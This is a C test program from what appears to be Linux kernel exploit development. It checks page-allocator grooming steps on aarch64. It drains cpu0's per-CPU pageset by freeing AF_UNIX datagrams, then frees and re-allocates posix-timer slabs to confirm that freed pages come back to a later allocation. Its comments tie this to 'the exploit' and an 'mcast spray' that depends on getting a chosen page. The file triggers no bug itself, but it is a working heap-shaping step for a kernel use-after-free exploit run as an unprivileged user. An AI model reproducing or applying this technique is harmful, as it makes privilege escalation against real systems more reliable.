/* pcp3: validate, benignly, the two allocator facts the run15 fix uses.
 *
 *   1. Freeing queued AF_UNIX datagrams in growing chunks takes cpu0's
 *      pageset below its high mark (the ic_pcp_prime_low loop).  Every free
 *      is checked against the live counter, so this also measures how many
 *      pages one datagram's data object really returns.
 *   2. Once the pageset is shallow, the order-1 free of discarded posix
 *      timer slabs lands in the pageset without draining it: the count
 *      rises by 2 per slab instead of collapsing to ~0.
 *   3. The next order-1 slab allocations pop those pages back off the
 *      pageset head, two pages per new slab -- the mechanism the mcast
 *      spray relies on to be handed X.
 *
 * Nothing here is a use-after-free: SIGEV_NONE timers only, no reap, no
 * node walks.  Run as the ordinary shell uid.
 *
 * build: zig cc -D_GNU_SOURCE -target aarch64-linux-musl -static -O2
 */
#define _GNU_SOURCE
#include <errno.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

#define PER_SLAB 31
#define PAYLOAD 15360U
#define SOCKBUF (4 * 1024 * 1024)
#define MAXSOCKS 64

struct zstat {
	unsigned count, high, batch;
};

static int first_cpu(void)
{
	cpu_set_t s;
	int i;

	CPU_ZERO(&s);
	if (sched_getaffinity(0, sizeof(s), &s))
		return 0;
	for (i = 0; i < CPU_SETSIZE; i++)
		if (CPU_ISSET(i, &s))
			return i;
	return 0;
}

static void pin_cpu(int cpu)
{
	cpu_set_t s;

	CPU_ZERO(&s);
	CPU_SET(cpu, &s);
	if (sched_setaffinity(0, sizeof(s), &s))
		fprintf(stderr, "setaffinity(%d): %s\n", cpu, strerror(errno));
}

/* Same parser as the exploit's ic_pcp_count0. */
static int zone_count(int cpu, struct zstat *z)
{
	char line[256];
	int cur = -1, in_normal = 0, in_sets = 0, got = 0;
	FILE *f;

	f = fopen("/proc/zoneinfo", "r");
	if (!f)
		return -1;
	while (fgets(line, sizeof(line), f)) {
		const char *p;

		if (!strncmp(line, "Node ", 5)) {
			p = strstr(line, "zone");
			in_normal = p && strstr(p, "Normal") ? 1 : 0;
			in_sets = 0;
			cur = -1;
			continue;
		}
		if (!in_normal)
			continue;
		if (strstr(line, "pagesets")) {
			in_sets = 1;
			continue;
		}
		if (!in_sets)
			continue;
		if (sscanf(line, " cpu: %d", &cur) == 1) {
			if (cur == cpu)
				got = 0;
			continue;
		}
		if (cur != cpu)
			continue;
		if (sscanf(line, " count: %u", &z->count) == 1) {
			got |= 1;
			continue;
		}
		if (sscanf(line, " high: %u", &z->high) == 1) {
			got |= 2;
			continue;
		}
		if (sscanf(line, " batch: %u", &z->batch) == 1) {
			got |= 4;
			continue;
		}
	}
	fclose(f);
	return got == 7 ? 0 : -1;
}

static long pcp(const char *tag)
{
	struct zstat z;

	if (zone_count(0, &z)) {
		fprintf(stderr, "%-12s cpu=%d ?\n", tag, sched_getcpu());
		return -1;
	}
	fprintf(stderr, "%-12s cpu=%d count=%u high=%u batch=%u\n", tag,
		sched_getcpu(), z.count, z.high, z.batch);
	return (long)z.count;
}

static long posix_objs(void)
{
	char line[512];
	FILE *f = fopen("/proc/slabinfo", "r");
	long n = -1;

	if (!f)
		return -1;
	while (fgets(line, sizeof(line), f)) {
		char name[64];
		unsigned a, t, osz, ps, pps, lim, bcnt, sf, as, ns, sa;

		if (sscanf(line,
			   "%63s %u %u %u %u %u : tunables %u %u %u : slabdata %u %u %u",
			   name, &a, &t, &osz, &ps, &pps, &lim, &bcnt, &sf, &as,
			   &ns, &sa) != 12)
			continue;
		if (strcmp(name, "posix_timers_cache"))
			continue;
		n = (long)t;
		break;
	}
	fclose(f);
	return n;
}

static int fds[MAXSOCKS][2];
static int nsocks;

static int skb_queue(unsigned int want)
{
	int bufsz = SOCKBUF;
	unsigned int i;
	unsigned long queued = 0;
	char *msg = malloc(PAYLOAD);

	if (!msg)
		return -1;
	if (want > MAXSOCKS)
		want = MAXSOCKS;
	memset(msg, 0x41, PAYLOAD);
	for (i = 0; i < want; i++) {
		if (socketpair(AF_UNIX, SOCK_DGRAM | SOCK_CLOEXEC, 0, fds[i]))
			break;
		(void)setsockopt(fds[i][0], SOL_SOCKET, SO_SNDBUF, &bufsz,
				 sizeof(bufsz));
		(void)setsockopt(fds[i][1], SOL_SOCKET, SO_RCVBUF, &bufsz,
				 sizeof(bufsz));
	}
	nsocks = (int)i;
	for (i = 0; i < (unsigned int)nsocks; i++) {
		for (;;) {
			ssize_t r = send(fds[i][0], msg, PAYLOAD,
					 MSG_DONTWAIT | MSG_NOSIGNAL);

			if (r != (ssize_t)PAYLOAD)
				break;
			queued++;
		}
	}
	free(msg);
	fprintf(stderr, "queued %lu datagrams on %d sockets\n", queued, nsocks);
	return (int)queued;
}

static unsigned long skb_free(unsigned long max)
{
	unsigned long freed = 0;
	int i;

	for (i = 0; i < nsocks && freed < max; i++) {
		while (freed < max) {
			ssize_t r = recv(fds[i][1], NULL, 0,
					 MSG_TRUNC | MSG_DONTWAIT);

			if (r < 0)
				break;
			freed++;
		}
	}
	return freed;
}

/* Wait for posix num_objs to fall by a whole slab; same 1 ms poll as the
 * exploit (the nanosleep is what lets the RCU frees complete). */
static long wait_drop(long base, unsigned int timeout_ms)
{
	struct timespec ts = { .tv_nsec = 1000000 };
	unsigned int waited = 0;

	while (waited < timeout_ms) {
		long now = posix_objs();

		if (now > 0 && now <= base - PER_SLAB)
			return waited;
		nanosleep(&ts, NULL);
		waited++;
	}
	return -1;
}

int main(int argc, char **argv)
{
	unsigned int slabs = argc > 1 ? (unsigned)strtoul(argv[1], 0, 0) : 40;
	unsigned int socks = argc > 2 ? (unsigned)strtoul(argv[2], 0, 0) : 8;
	unsigned int n = slabs * PER_SLAB;
	unsigned int i;
	timer_t *t;
	struct sigevent sev;
	struct zstat z;
	long c0, c1;
	long base;
	int dgrams;
	unsigned long chunk, freed, maxf;
	unsigned int slack = 512;

	pin_cpu(first_cpu());
	memset(&sev, 0, sizeof(sev));
	sev.sigev_notify = SIGEV_NONE;

	c0 = pcp("start");
	if (c0 < 0)
		return 1;

	/* 1. the prime: growing datagram chunks until the pageset is low */
	dgrams = skb_queue(socks);
	if (dgrams <= 0)
		return 1;
	maxf = 1024;
	chunk = 64;
	freed = 0;
	for (i = 0; i < 8; i++) {
		if (zone_count(0, &z))
			break;
		if ((long)z.high - (long)z.count >= (long)slack)
			break;
		if (freed >= maxf)
			break;
		if (freed + chunk > maxf)
			chunk = maxf - freed;
		if (!chunk)
			break;
		freed += skb_free(chunk);
		{
			char tag[48];

			snprintf(tag, sizeof(tag), "prime %lu", freed);
			pcp(tag);
		}
		chunk <<= 1;
	}
	c1 = pcp("primed");

	/* 2. fill slabs, then free them: the order-1 frees must go into the
	 * shallow pageset without draining it. */
	t = calloc(n, sizeof(*t));
	if (!t)
		return 1;
	fprintf(stderr, "creating %u timers (%u slabs)\n", n, slabs);
	for (i = 0; i < n; i++) {
		if (timer_create(CLOCK_MONOTONIC, &sev, &t[i])) {
			fprintf(stderr, "timer_create #%u: %s\n", i,
				strerror(errno));
			n = i;
			break;
		}
	}
	pcp("filled");

	base = posix_objs();
	fprintf(stderr, "deleting %u timers, base=%ld\n", n, base);
	for (i = 0; i < n; i++)
		timer_delete(t[i]);
	pcp("pre-drop");
	fprintf(stderr, "drop after %ld ms\n", wait_drop(base, 3000));
	pcp("post-drop");
	usleep(300000);
	pcp("settled");

	/* 3. allocate fresh slabs again: the pageset should hand them back */
	fprintf(stderr, "re-creating %u timers\n", n);
	for (i = 0; i < n; i++) {
		if (timer_create(CLOCK_MONOTONIC, &sev, &t[i])) {
			fprintf(stderr, "timer_create2 #%u: %s\n", i,
				strerror(errno));
			n = i;
			break;
		}
		if ((i + 1) % (PER_SLAB * 20) == 0) {
			char tag[48];

			snprintf(tag, sizeof(tag), "refill %u", i + 1);
			pcp(tag);
		}
	}
	pcp("refilled");
	usleep(200000);
	pcp("refilled+");

	for (i = 0; i < n; i++)
		timer_delete(t[i]);
	fprintf(stderr, "done\n");
	return 0;
}
